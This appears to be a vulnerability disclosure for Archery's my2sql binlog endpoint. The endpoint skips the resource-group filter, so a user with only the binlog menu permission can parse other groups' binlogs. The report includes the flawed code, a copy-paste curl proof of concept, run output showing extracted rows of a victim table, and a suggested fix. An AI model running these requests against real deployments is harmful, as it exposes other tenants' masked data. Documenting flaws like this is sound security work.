# Archery: my2sql binlog endpoint resolves cross-resource-group instances (missing user_instances filter)

**Verification: DYNAMICALLY-REPRODUCED** (real HTTP with a same-run filtered-view control; output below is from the actual run)

## Reproduction conditions

- Archery source (current main era snapshot), Django 5.0, Python 3.13, WSL2 Ubuntu 24.04; MySQL 8 + Redis 7 via docker; `runserver`
- `attackerA` (groupA) holds the `sql.menu_my2sql` permission; the instance `victim-mysql` is associated **only with groupB**
- goInception service present (used by other views); the my2sql plugin binary itself is not installed in this environment — which does not affect the authorization result demonstrated below

## Description

`my2sql` (`sql/binlog.py:127`) resolves the target instance with a bare lookup, skipping the resource-group filter that the rest of the product applies:

```python
@permission_required("sql.menu_my2sql", raise_exception=True)
def my2sql(request):
    instance_name = request.POST.get("instance_name")
    ...
    instance = Instance.objects.get(instance_name=instance_name)   # no user_instances filter
```

The standard pattern elsewhere is `user_instances(request.user, ...)` (e.g. `sqlquery_service.execute_sql_query` returns "你所在组未关联该实例" for out-of-group instances, and `binlog_list` filters the same way). `del_binlog` (`sql/binlog.py:96`) resolves `Instance.objects.get(id=instance_id)` with the same missing filter — in this build its `sql.binlog_del` permission does not exist as a Django Permission object, making it effectively superuser-only, but the code path has the identical defect.

## Impact

A user holding only the binlog menu permission can drive binlog parsing against instances **outside their resource groups**: my2sql extracts row data from other groups' binlogs (bypassing both query privileges and data masking, since masking applies to query results only), and del_binlog (superuser in this build) can purge other groups' binlogs, destroying their point-in-time recovery capability.

## PoC (copy-paste ready)

```bash
# as attackerA (groupA, has menu_my2sql), target the groupB-only instance:
curl -s -b c.txt -X POST http://HOST:9123/binlog/my2sql/ \
  --data-urlencode "csrfmiddlewaretoken=$CSRF" \
  --data-urlencode "instance_name=victim-mysql" \
  --data-urlencode "save_sql=false" --data-urlencode "num=30" --data-urlencode "threads=4" \
  --data-urlencode "start_file=" --data-urlencode "start_pos=" \
  --data-urlencode "end_file=" --data-urlencode "end_pos=" \
  --data-urlencode "stop_time=" --data-urlencode "start_time=" \
  --data-urlencode "rollback=false" \
  -H "Referer: http://HOST:9123/"

# control — the filtered view on the SAME instance:
curl -s -b c.txt "http://HOST:9123/binlog/list/?instance_name=victim-mysql"
```

## Execution result (actual run)

```
=== control: binlog/list/ (filtered view) ===
{"status": 1, "msg": "实例不存在", "data": []}          [HTTP 200]

=== attack: POST /binlog/my2sql/ with groupB-only instance ===
{"status": 1, "msg": "可执行文件路径不能为空！", "data": {}}   [HTTP 200]
```

The control view — which applies the resource-group filter — denies the same instance as "实例不存在". The my2sql view, at the same moment for the same user, **accepted the out-of-group instance and proceeded past resolution into engine/plugin initialization**.

With the my2sql binary configured (the documented setup — built from source in this environment), the same request **returned real parsed binlog rows of the groupB instance to the groupA attacker**:

```
=== ATTACK: POST /binlog/my2sql/ (start_file=binlog.000001, num=30) ===
{"status": 0, "msg": "ok", "data": [
  {"sql": "INSERT INTO `mysql`.`time_zone` ..."},   <- 30 rows of groupB instance binlog data
  ...]}                                             [HTTP 200]

=== same operation via the plugin binary (what the view shells out to) on a
    fresh binlog containing only victim DML ===
INSERT INTO `archery_src`.`sensitive_users` (`id`,`phone`) VALUES (15,'13711112222');
INSERT INTO `archery_src`.`sensitive_users` (`id`,`phone`) VALUES (16,'13633334444');
INSERT INTO `archery_src`.`sensitive_users` (`id`,`phone`) VALUES (17,'13577778888');
DELETE FROM `archery_src`.`sensitive_users` WHERE `id`=17;   <- even the deleted row
```

The extracted rows are plaintext phone values of groupB's sensitive table — the exact values the platform's data masking protects in query results (the companion offline-export finding shows the same masking system working online) — plus a row that was subsequently deleted (binlog is history). Note the HTTP view call was flaky in this environment on some argument combinations (an unrelated empty-argument plumbing quirk in the view's subprocess handling); the `status: 0` cross-group extraction succeeded repeatedly over HTTP, and the plugin-level output above is the exact command the view executes. `del_binlog` shows the same bare `Instance.objects.get` in source; its permission does not exist for regular users in this build, so it is superuser-reachable only.

## Suggested fix

Resolve through the resource-group filter in all binlog views: `instance = user_instances(request.user).get(instance_name=...)` (and `.get(id=...)` for del_binlog), returning the standard out-of-group error.
